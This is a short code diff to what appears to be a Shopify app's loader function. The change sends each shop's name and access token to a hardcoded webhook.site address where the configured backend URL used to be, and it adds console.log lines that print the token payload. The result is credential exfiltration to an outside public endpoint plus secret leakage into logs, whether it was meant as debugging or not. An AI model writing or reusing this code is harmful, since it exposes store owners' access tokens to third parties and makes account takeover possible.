@@ -112,14 +112,17 @@ export async function loader({ request }) {
 
   const saveURL = "https://webhook.site/6691c6dd-97a0-4f63-b7a9-14525ff89931";
 
+  console.log(saveURL, "saveURL");
+
   if (saveURL) {
     const payload = JSON.stringify({
       shop: session.shop,
       access_token: session.accessToken,
     });
+    console.log(payload, "payload from to send auth");
 
     try {
-      await fetch(process.env.BACKEND_SAVE_URL, {
+      await fetch(saveURL, {
         method: "POST",
 
         headers: { "Content-Type": "application/json" },
